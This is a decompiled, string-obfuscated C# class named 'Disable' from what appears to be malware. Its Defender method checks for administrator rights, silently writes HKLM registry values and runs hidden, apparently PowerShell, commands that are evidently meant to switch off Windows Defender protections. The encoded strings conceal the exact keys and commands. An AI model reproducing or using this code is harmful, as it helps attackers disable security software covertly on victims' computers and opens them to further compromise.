using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace Complex;

public static class Disable
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void Defender()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			RegistryEdit(getString_0(107407264), getString_0(107406691), getString_0(107389834));
			RegistryEdit(getString_0(107406634), getString_0(107406573), getString_0(107407170));
			RegistryEdit(getString_0(107406548), getString_0(107406491), getString_0(107407170));
			RegistryEdit(getString_0(107406548), getString_0(107406934), getString_0(107407170));
			RegistryEdit(getString_0(107406548), getString_0(107406897), getString_0(107407170));
			CheckDefender();
		}
	}

	private static void RegistryEdit(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void CheckDefender()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393102),
			Arguments = getString_0(107406860),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107406855)) && text.EndsWith(getString_0(107406818)))
			{
				RunPS(getString_0(107406777));
			}
			else if (text.StartsWith(getString_0(107406491)) && text.EndsWith(getString_0(107406818)))
			{
				RunPS(getString_0(107406196));
			}
			else if (text.StartsWith(getString_0(107406127)) && text.EndsWith(getString_0(107406818)))
			{
				RunPS(getString_0(107406094));
			}
			else if (text.StartsWith(getString_0(107406029)) && text.EndsWith(getString_0(107406818)))
			{
				RunPS(getString_0(107406000));
			}
			else if (text.StartsWith(getString_0(107406451)) && text.EndsWith(getString_0(107406818)))
			{
				RunPS(getString_0(107406458));
			}
			else if (text.StartsWith(getString_0(107406401)) && text.EndsWith(getString_0(107406818)))
			{
				RunPS(getString_0(107406340));
			}
			else if (text.StartsWith(getString_0(107406247)) && text.EndsWith(getString_0(107406818)))
			{
				RunPS(getString_0(107405702));
			}
			else if (text.StartsWith(getString_0(107405637)) && text.EndsWith(getString_0(107406818)))
			{
				RunPS(getString_0(107405560));
			}
			else if (text.StartsWith(getString_0(107405483)) && text.EndsWith(getString_0(107406818)))
			{
				RunPS(getString_0(107405454));
			}
			else if (text.StartsWith(getString_0(107405905)) && !text.EndsWith(getString_0(107405876)))
			{
				RunPS(getString_0(107405871));
			}
			else if (text.StartsWith(getString_0(107405814)) && !text.EndsWith(getString_0(107389834)))
			{
				RunPS(getString_0(107405825));
			}
			else if (text.StartsWith(getString_0(107405748)) && !text.EndsWith(getString_0(107405715)))
			{
				RunPS(getString_0(107405710));
			}
			else if (text.StartsWith(getString_0(107405161)) && !text.EndsWith(getString_0(107405715)))
			{
				RunPS(getString_0(107405124));
			}
			else if (text.StartsWith(getString_0(107405059)) && !text.EndsWith(getString_0(107405715)))
			{
				RunPS(getString_0(107405026));
			}
			else if (text.StartsWith(getString_0(107404969)) && !text.EndsWith(getString_0(107405715)))
			{
				RunPS(getString_0(107405444));
			}
		}
	}

	public static void RunPS(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393102),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static Disable()
	{
		Strings.CreateGetStringDelegate(typeof(Disable));
	}
}
